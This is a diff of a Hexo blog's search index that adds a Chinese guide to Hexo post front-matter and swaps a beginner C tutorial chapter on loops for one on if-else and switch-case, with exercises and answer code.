+ <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 这里写文章标题            # 标题：随便写，支持中文</span><br><span class="line">date: 2025-12-09 18:00:00       # 发布时间：注意格式，冒号后有空格</span><br><span class="line">updated: 2025-12-10 12:00:00    # 更新时间：可选，不写默认等于发布时间</span><br><span class="line">tags:                           # 标签：扁平化，一篇可以有多个</span><br><span class="line"><span class="bullet">    -</span> CTF</span><br><span class="line"><span class="bullet">    -</span> Web</span><br><span class="line">categories:                     # 分类：层级化，支持父子关系</span><br><span class="line"><span class="bullet">    -</span> 学习笔记                   #父分类</span><br><span class="line"><span class="section">    - 渗透测试                   # 子分类</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>
+<p> 注意事项：</p>
+<ul>
+<li>冒号后面必须有一个空格（比如 title: 标题 是对的，title:标题 是错的）。</li>
+<li>缩进：分类和标签的列表要对齐。</li>
+</ul>
+<p> 还有“特效”字段：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">cover: /img/封面图.png           # 首页卡片显示的封面图</span><br><span class="line">top<span class="emphasis">_img: /img/顶部图.png         # 点进文章后，顶部那个长条背景图</span></span><br><span class="line"><span class="emphasis">                                # (如果不写，默认显示你在 _</span>config.butterfly.yml 设置的那张 default<span class="emphasis">_top_</span>img)</span><br><span class="line"></span><br><span class="line">comments: true                  # 是否开启评论 (默认为 true，填 false 可关闭这篇的评论)</span><br><span class="line">toc: true                       # 是否显示右侧目录 (默认为 true)</span><br><span class="line">toc<span class="emphasis">_number: true                # 目录是否显示序号 (1. 1.1 ...)</span></span><br><span class="line"><span class="emphasis">copyright: true                 # 是否显示文末版权信息</span></span><br><span class="line"><span class="emphasis">---    </span></span><br></pre></td></tr></table></figure><br> 例如我想写c语言学习笔记：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: C语言学习笔记01</span><br><span class="line">date: 2025-12-09 20:00:00</span><br><span class="line">updated: 2025-12-09 20:00:00</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> 编程语言      </span><br><span class="line"><span class="bullet">-</span> C语言         </span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> C语言</span><br><span class="line">cover: /img/sg<span class="emphasis">_meter.jpg   </span></span><br><span class="line"><span class="emphasis">top_</span>img: /img/sg<span class="emphasis">_lab.jpg   </span></span><br><span class="line"><span class="emphasis">toc: true</span></span><br><span class="line"><span class="emphasis">toc_</span>number: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正文...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>清理、构建、部署：</p>
+ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>]]></content>
+      <categories>
+        <category>博客搭建</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>备忘录</tag>
       </tags>
   </entry>
   <entry>
@@ -636,140 +677,132 @@
       </tags>
   </entry>
   <entry>
-    <title>3. 流程控制 (循环结构)</title>
-    <url>/2025/12/12/3-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<h1 id="第三章：流程控制-循环结构"><a href="#第三章：流程控制-循环结构" class="headerlink" title="第三章：流程控制 (循环结构)"></a>第三章：流程控制 (循环结构)</h1><p><strong>本章核心：</strong> 让程序学会“重复做某事”（转圈圈）。</p>
+    <title>2. 流程控制(选择结构)</title>
+    <url>/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/</url>
+    <content><![CDATA[<h1 id="第二章：流程控制-选择结构"><a href="#第二章：流程控制-选择结构" class="headerlink" title="第二章：流程控制 (选择结构) "></a>第二章：流程控制 (选择结构) </h1><p><strong>本章核心：</strong> 让程序学会“思考”和“做决定”（如果…就…，否则…）。</p>
 <hr>
-<h2 id="1-for-循环"><a href="#1-for-循环" class="headerlink" title="1. for 循环"></a>1. <code>for</code> 循环</h2><p>适用于<strong>已知循环次数</strong>的情况。这是最常用的循环。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化; 条件判断; 步进) &#123;</span><br><span class="line">    <span class="comment">// 循环体代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h2 id="1-关系运算符与逻辑运算符"><a href="#1-关系运算符与逻辑运算符" class="headerlink" title="1. 关系运算符与逻辑运算符"></a>1. 关系运算符与逻辑运算符</h2><p>判断语句基于关系运算符（例如 <code>&gt;</code>、<code>==</code>）的结果（真或假）。</p>
+<h3 id="1-1-关系运算符"><a href="#1-1-关系运算符" class="headerlink" title="1.1 关系运算符"></a>1.1 关系运算符</h3><p><code>==</code> (等于), <code>!=</code> (不等于), <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>。</p>
+<h3 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2 逻辑运算符"></a>1.2 逻辑运算符</h3><p><code>&amp;&amp;</code> (与), <code>||</code> (或), <code>!</code> (非)。</p>
+<p><strong>补充考点：</strong></p>
 <ul>
-<li><p><strong>初始化</strong>：循环开始前执行一次（如 <code>int i = 0</code>）。</p>
+<li><p><strong>数学写法 vs C 语言写法</strong>：</p>
+<ul>
+<li><p>数学里写：$0 &lt; x &lt; 10$</p>
 </li>
-<li><p><strong>条件判断</strong>：每次循环前检查，如果为真就继续，为假就停止（如 <code>i &lt; 10</code>）。</p>
+<li><p>C 语言<strong>必须</strong>写成：<code>(x &gt; 0) &amp;&amp; (x &lt; 10)</code></p>
 </li>
-<li><p><strong>步进</strong>：每次循环结束后执行（如 <code>i++</code>，表示 i 加 1）。</p>
+</ul>
+</li>
+<li><p><strong>优先级</strong>：</p>
+<ul>
+<li><code>!</code> (最高) &gt; 算术运算符 &gt; 关系运算符 &gt; <code>&amp;&amp;</code> &gt; <code>||</code> (最低)。</li>
+</ul>
 </li>
 </ul>
 <hr>
-<h3 id="习题-1-对应：for-循环与累加器"><a href="#习题-1-对应：for-循环与累加器" class="headerlink" title="习题 1 (对应：for 循环与累加器)"></a>习题 1 (对应：for 循环与累加器)</h3><p><strong>题目：</strong> 编写程序，计算从 <strong>1 加到 100</strong> 的总和 ($1 + 2 + 3 + \dots + 100$)。</p>
+<h3 id="习题-1-对应：关系与逻辑运算"><a href="#习题-1-对应：关系与逻辑运算" class="headerlink" title="习题 1 (对应：关系与逻辑运算)"></a>习题 1 (对应：关系与逻辑运算)</h3><p><strong>题目：</strong> 编写代码判断输入的三个整数 a, b, c 能否构成三角形。</p>
+<p><strong>构成三角形的条件：</strong> 任意两边之和大于第三边。</p>
+<p><strong>要求：</strong> 使用逻辑与运算符 <code>&amp;&amp;</code> 连接三个条件。</p>
+<p><strong>预期输出结果：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入三边: 3 4 5</span><br><span class="line">可以构成三角形</span><br></pre></td></tr></table></figure>
+
+<p><strong>答案：</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入三边: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须三个条件同时满足，所以用 &amp;&amp;</span></span><br><span class="line">    <span class="keyword">if</span> ((a + b &gt; c) &amp;&amp; (a + c &gt; b) &amp;&amp; (b + c &gt; a)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;可以构成三角形\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法构成三角形\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>易错：</strong></p>
+<ol>
+<li><p>将 <code>a+b&gt;c</code> 等条件用 <code>||</code> 连接（变成了“只要有一组边满足就行”，逻辑错误）。</p>
+</li>
+<li><p>试图写成数学连写形式 <code>a+b&gt;c&gt;...</code> (C 语言不支持)。</p>
+</li>
+</ol>
+<hr>
+<h2 id="2-if-else-结构"><a href="#2-if-else-结构" class="headerlink" title="2. if-else 结构"></a>2. <code>if-else</code> 结构</h2><p>用于根据条件的真假执行不同的代码块。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件表达式) &#123;</span><br><span class="line">    <span class="comment">// 1. 如果条件为真 (非0)，执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 如果条件为假 (0)，执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例：</strong> 判断一个数是否为正数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">-5</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;是正数\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;不是正数\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 不是正数</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>补充考点 (悬挂 else)：</strong></p>
+<p>当有多个 if 和 else 嵌套时，C 语言规定：else 总是与它上面最近的、未配对的 if 配对。</p>
+<ul>
+<li><strong>建议</strong>：无论只有一行代码还是多行，永远加上 <code>{ }</code>，防止逻辑混乱。</li>
+</ul>
+<hr>
+<h2 id="3-多重条件-if-else-if-else"><a href="#3-多重条件-if-else-if-else" class="headerlink" title="3. 多重条件 (if-else if-else)"></a>3. 多重条件 (<code>if-else if-else</code>)</h2><p>用于处理多个互斥的条件判断。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件 <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 满足条件 1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件 <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 不满足条件 1，但满足条件 2</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 所有条件都不满足</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="习题-2"><a href="#习题-2" class="headerlink" title="习题 2"></a>习题 2</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>整数成绩 (<code>score</code>)</strong>，根据以下标准输出评定结果。</p>
 <p><strong>要求：</strong></p>
 <ol>
-<li><p>必须使用 <strong><code>for</code> 循环</strong>。</p>
+<li><p>使用 <code>if-else if-else</code> 结构。</p>
 </li>
-<li><p>定义变量 <code>sum</code> 存储总和，<strong>必须初始化为 0</strong>。</p>
+<li><p>成绩范围 0-100。</p>
+<ul>
+<li><p>$\ge 90$: A (优秀)</p>
+</li>
+<li><p>$\ge 70$ 且 $&lt; 90$: B (良好)</p>
+</li>
+<li><p>$&lt; 70$: C (及格线以下)</p>
+</li>
+</ul>
 </li>
 </ol>
 <p><strong>预期输出结果：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1到100的和是: 5050</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入您的成绩 (0-100): </span><br><span class="line">85</span><br><span class="line">评定结果: B (良好)</span><br></pre></td></tr></table></figure>
 
 <p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// ⚠️ 易错点：累加器必须初始化为 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">        sum = sum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1到100的和是: %d\n&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入您的成绩 (0-100): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标准逻辑流：从高到低判断，代码更易读</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: A (优秀)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="comment">// 能走到这里，说明分数肯定小于 90，所以只需判断是否 &gt;= 70</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: B (良好)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 剩下的所有情况 (即小于 70)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: C (及格线以下)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>易错：</strong></p>
 <ol>
-<li><p><code>sum</code> 忘记初始化（结果会是垃圾值）。</p>
+<li><p>逻辑顺序混乱：如果先判断 <code>score &gt;= 70</code>，那么 95 分也会被判定为 B（因为 95 也大于 70）。</p>
 </li>
-<li><p>循环条件写错（如 <code>i &lt; 100</code> 会少加一个 100）。</p>
+<li><p>在 <code>else</code> 后面画蛇添足加条件（<code>else (score &lt; 70)</code> 是语法错误，<code>else</code> 后不能跟括号）。</p>
 </li>
 </ol>
 <hr>
-<h2 id="2-while-循环"><a href="#2-while-循环" class="headerlink" title="2. while 循环"></a>2. <code>while</code> 循环</h2><p> 适用于<strong>不知道具体次数，只知道停止条件</strong>的情况。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件为真) &#123;</span><br><span class="line">    <span class="comment">// 只要条件成立，就一直做</span></span><br><span class="line">    <span class="comment">// 注意：必须在内部改变条件变量，否则会死循环！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="4-switch-case-结构"><a href="#4-switch-case-结构" class="headerlink" title="4. switch-case 结构"></a>4. <code>switch-case</code> 结构</h2><p>适用于<strong>一个变量</strong>的取值，需要执行<strong>多分支选择</strong>的情况。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (变量/表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">1</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 必须要有！</span></span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 如果所有 case 都不匹配，则执行 default</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>补充考点 (C 语言真假法则)：</strong> C 语言没有 <code>true</code>&#x2F;<code>false</code> 关键字（C89标准）。</p>
+<p><strong>重点提醒 ：</strong></p>
+<p><strong>易错点：</strong> switch 语句中 break 的使用</p>
 <ul>
-<li><p><strong>0</strong> 是 <strong>假</strong>。</p>
+<li><strong>陷阱：</strong> 如果一个 <code>case</code> 分支中<strong>没有 <code>break</code></strong>，程序会继续执行下一个 <code>case</code> 分支的代码，直到遇到 <code>break</code> 或 <code>switch</code> 结束。这通常被称为<strong>穿透 (fall-through)</strong>，是初学者最常犯的逻辑错误。</li>
+</ul>
+<p><strong>补充考点 (类型限制)：</strong> switch 括号里的变量，以及 case 后面的值，必须是整数 (int) 或字符 (char)。</p>
+<ul>
+<li><p><strong>错误</strong>：<code>case 3.14:</code> (不能用浮点数)</p>
 </li>
-<li><p><strong>非 0</strong> 都是 <strong>真</strong>。</p>
-</li>
-<li><p><code>while(1)</code> 是死循环，<code>while(0)</code> 永远不执行。</p>
+<li><p><strong>错误</strong>：<code>case &quot;A&quot;:</code> (不能用字符串，字符用单引号 <code>&#39;A&#39;</code>)</p>
 </li>
 </ul>
 <hr>
-<h3 id="习题-2-对应：while-循环与逻辑判断"><a href="#习题-2-对应：while-循环与逻辑判断" class="headerlink" title="习题 2 (对应：while 循环与逻辑判断)"></a>习题 2 (对应：while 循环与逻辑判断)</h3><p><strong>(源自你的笔记 task 2.2 猜数字基础版)</strong></p>
-<p><strong>题目：</strong> 预设一个数字 <code>target = 66</code>，让用户不断输入数字去猜。</p>
-<ul>
-<li><p>猜大了提示“太大了”。</p>
+<h3 id="习题-3"><a href="#习题-3" class="headerlink" title="习题 3"></a>习题 3</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>星期数 (1-7 之间的整数 <code>day</code>)</strong>，输出对应的星期名称（Monday, Tuesday… Sunday）。如果输入其他数字，输出 “Error”。</p>
+<p><strong>要求：</strong></p>
+<ol>
+<li><p>必须使用 <strong><code>switch-case</code></strong> 结构。</p>
 </li>
-<li><p>猜小了提示“太小了”。</p>
+<li><p><strong>易错点：</strong> 每一个 <code>case</code> 结束时必须有 <strong><code>break;</code></strong>。</p>
 </li>
-<li><p>猜中了提示“恭喜”并结束。</p>
+<li><p><strong>默认处理：</strong> 使用 <code>default:</code> 处理非 1-7 的输入。</p>
 </li>
-</ul>
-<p><strong>要求：</strong> 使用 <code>while(1)</code> 配合 <code>break</code> 语句来实现。</p>
+</ol>
 <p><strong>预期输出结果：</strong></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">猜猜我是谁(0-100): 50</span><br><span class="line">太小了</span><br><span class="line">猜猜我是谁(0-100): 66</span><br><span class="line">恭喜猜中！</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入星期数 (1-7): </span><br><span class="line">3</span><br><span class="line">星期三</span><br></pre></td></tr></table></figure>
 
 <p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> target = <span class="number">66</span>;</span><br><span class="line">    <span class="type">int</span> guess;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 死循环</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;猜猜我是谁(0-100): \n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;guess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (guess &gt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太大了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (guess &lt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太小了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜猜中！\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// ✋ 核心：猜中后跳出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> day; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入星期数 (1-7):\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;day);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// ✅ 必须有 break，防止穿透</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期四\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期五\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期六\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期日\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 处理所有非 1-7 的情况</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误，请输入1到7之间的数字。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>易错：</strong></p>
 <ol>
-<li><p><code>while</code> 后面忘记加大括号 <code>{}</code>。</p>
+<li><p>漏写 <code>break;</code> 导致程序打印出多天的名字。</p>
 </li>
-<li><p>在死循环中忘记写 <code>break</code> 导致程序无法结束。</p>
+<li><p><code>switch</code> 后面的括号里不需要分号 <code>;</code>。</p>
 </li>
-</ol>
-<hr>
-<h2 id="3-do-while-循环-导师补充"><a href="#3-do-while-循环-导师补充" class="headerlink" title="3. do-while 循环 (导师补充)"></a>3. <code>do-while</code> 循环 (导师补充)</h2><p><strong>(考点补充)</strong> 这是一个<strong>至少执行一次</strong>的循环。</p>
-<ul>
-<li><p>先干活，后判断。</p>
-</li>
-<li><p><strong>试卷考点</strong>：试卷 <strong>005.jpg</strong> 编程题第 3 题就用到了 <code>do-while</code> 结构。</p>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 先执行这里</span></span><br><span class="line">&#125; <span class="keyword">while</span> (条件); <span class="comment">//注意：这里必须有分号！</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="4-循环控制：break-与-continue"><a href="#4-循环控制：break-与-continue" class="headerlink" title="4. 循环控制：break 与 continue"></a>4. 循环控制：<code>break</code> 与 <code>continue</code></h2><p>这是选择题必考点：</p>
-<ol>
-<li><p><strong><code>break</code></strong>：<strong>彻底跳出</strong>循环（不干了，直接辞职）。</p>
-</li>
-<li><p><strong><code>continue</code></strong>：<strong>跳过本次</strong>循环剩余部分，直接进入下一次循环（今天请假，明天继续）。</p>
-</li>
-</ol>
-<h3 id="习题-3-对应：break-vs-continue"><a href="#习题-3-对应：break-vs-continue" class="headerlink" title="习题 3 (对应：break vs continue)"></a>习题 3 (对应：break vs continue)</h3><p><strong>题目：</strong> 编写一个 <code>for</code> 循环从 1 输出到 5，但是：</p>
-<ol>
-<li><p>遇到 3 时，使用 <code>continue</code>。</p>
-</li>
-<li><p>（注释掉代码后）改为遇到 3 时，使用 break。<br>观察输出区别。</p>
-</li>
-</ol>
-<p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况 1: continue</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 1 2 4 5 (跳过了 3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况 2: break</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 1 2 (遇到 3 直接结束)</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="5-随机数生成-Random-Numbers"><a href="#5-随机数生成-Random-Numbers" class="headerlink" title="5. 随机数生成 (Random Numbers)"></a>5. 随机数生成 (Random Numbers)</h2><p>这是一个进阶考点，通常用于游戏开发或模拟题。</p>
-<h3 id="三步走战略"><a href="#三步走战略" class="headerlink" title="三步走战略"></a>三步走战略</h3><ol>
-<li><p><strong>头文件</strong>：<code>#include &lt;stdlib.h&gt;</code> 和 <code>#include &lt;time.h&gt;</code>。</p>
-</li>
-<li><p><strong>播种</strong>：<code>srand(time(NULL));</code> (在 <code>main</code> 开头写一次)。</p>
-</li>
-<li><p><strong>生成</strong>：<code>rand() % N</code> (生成 0 到 N-1 的数)。</p>
-</li>
-</ol>
-<p><strong>万能公式：</strong> 生成 [min, max] 之间的随机数：rand() % (max - min + 1) + min</p>
-<hr>
-<h3 id="习题-4-对应：随机数生成"><a href="#习题-4-对应：随机数生成" class="headerlink" title="习题 4 (对应：随机数生成)"></a>习题 4 (对应：随机数生成)</h3><p><strong>题目：</strong> 编写一个“真·猜数字”游戏。</p>
-<ol>
-<li><p>程序随机生成一个 <strong>1 到 100</strong> 之间的数字作为目标。</p>
-</li>
-<li><p>用户循环猜测，直到猜中。</p>
-</li>
-</ol>
-<p><strong>要求：</strong> 必须正确包含头文件和播种代码。</p>
-<p><strong>预期输出结果：</strong> (每次运行的目标数字应不同)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(假设随机到了 42)</span><br><span class="line">猜数: 50 -&gt; 太大了</span><br><span class="line">猜数: 42 -&gt; 恭喜猜中!</span><br></pre></td></tr></table></figure>
-
-<p><strong>答案：</strong></p>
